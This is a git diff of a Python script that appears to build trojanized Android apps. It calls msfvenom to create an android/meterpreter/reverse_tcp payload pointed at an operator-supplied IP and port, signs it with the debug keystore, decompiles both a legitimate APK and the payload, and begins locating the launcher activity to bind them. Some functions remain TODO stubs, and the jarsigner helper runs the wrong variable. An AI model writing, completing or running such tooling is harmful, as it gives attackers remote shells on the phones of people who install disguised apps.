@@ -3,6 +3,7 @@ import subprocess
 import argparse
 import sys
 import os
+import xml.etree.ElementTree as ET
 
 from apkhandling import builder
 
@@ -31,24 +32,32 @@ from apkhandling import builder
 # global dictonary for the arguments
 args={}
 
+def findlauncheractivity(manifest):
+    pass # TODO
+
+def scrapeFilesForLauncherActivity():
+    pass # TODO
+
 def parseArgs():
     global args
     parser = argparse.ArgumentParser(description="")
     parser.add_argument("-o", "--original", action="store", dest="original_apk" , default="")
     parser.add_argument("-m", "--malware", action="store", dest="malware_apk", default="")
     parser.add_argument("-out", "--output", action="store", dest="output_dir", default="")
-    parser.add_argument("--meterpreter_arguments", action="store", nargs=2, dest="meterpreter_arguments", default="")
+    parser.add_argument("--meterpreter_ip", action="store", dest="meterpreter_ip", default="")
+    parser.add_argument("--meterpreter_port", action="store", dest="meterpreter_port", default="")
     args_parsed = parser.parse_args(sys.argv[1:])
 
     # convert to dictonary
     args = vars(args_parsed)
 
-    if args['meterpreter_arguments'] == "":
+    if args['meterpreter_port'] == "" or args['meterpreter_ip'] == "":
         args['metasploit_used'] = False
     else:
         args['metasploit_used'] = True
         # always android reverse shell and alway same output file
-        args['meterpreter_arguments'] = "-p android/meterpreter/reverse_tcp " + str(args['meterpreter_arguments'][0]) + " " + str(args['meterpreter_arguments'][1]) + " -o payload.apk"
+        args['meterpreter_arguments'] = "-p android/meterpreter/reverse_tcp LHOST=" + str(args['meterpreter_ip']) + \
+         " LPORT=" + str(args['meterpreter_port']) + " -o payload.apk"
 
 # checks if a given program is installed on the computer
 # Returns True or False
@@ -56,6 +65,35 @@ def isInstalled(program):
     proc = subprocess.Popen(["which " + program], stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
     return out != ""
+
+
+def run_meterpreter(command):
+    """ executes meterpreter with the options 
+        given in the 'command' argument """
+    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+
+    if "invalid" in out.lower() or \
+        "error" in out.lower():
+        print out
+        sys.exit(1)
+
+def run_jarsigner(command):
+    """ executes the jarsigner with specific options 
+        given in the 'command' argument"""
+    full_command = "jarsigner "+command
+    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    print out
+    print err
+
+
+def find_launcher_activity(root):
+    """
+        Finds the launcher activity from the 
+        XML.Tree root element given as parameter.
+    """
+    # TODO
 
 def main():
     global args
@@ -67,16 +105,45 @@ def main():
     if args['metasploit_used']:
         if not isInstalled("msfvenom"):
             print "[!] msfvenom (metasploit) is not installed, please install it and rerun the script"
+            sys.exit(1)
     if not isInstalled("apktool"):
         print "[!] apktool is not installed, please install it and rerun the script"
+        sys.exit(1)
     if not isInstalled("jarsigner"):
         print "[!] jarsigner is not installed, please install it and rerun the script"
+        sys.exit(1)
 
-    if args['metasploit_used']:
-        command = "msfvenom "+ args['meterpreter_arguments']
-        print str(command)
-        proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
-        (out, err) = proc.communicate()
+    if not args['metasploit_used']:
+        print "metasploit is required to run application, please activate metasploit"
+        sys.exit(1)
+    
+    
+    print "[*] Generating msfvenom payload..\n"
+    print "Metasploit command: msfvenom -f raw {} -o payload.apk 2>&1\n" \
+        .format(args['meterpreter_arguments'])
 
+    command = "msfvenom "+ args['meterpreter_arguments'] + " 2>&1"
+    print str(command)
 
+    run_meterpreter(command)
+
+    print "[*] Signing payload..\n"
+    run_jarsigner("-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey")
+
+    print "[*] Copy apk to desired place..\n"
+    proc = subprocess.Popen("cp "+args['original_apk']+" original.apk", stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    print out
+
+    print "[*] Decompiling orignal APK..\n"
+    builder.decompileApk("original.apk")
+    print "[*] Decompiling payload APK..\n"
+    builder.decompileApk("payload.apk")
+
+    # read the manifest to xml model
+    print "Reading android manifest"
+    tree = ET.parse('original/AndroidManifest.xml')
+    root = tree.getroot()
+
+    launcher_activity  = find_launcher_activity(root)
 main()
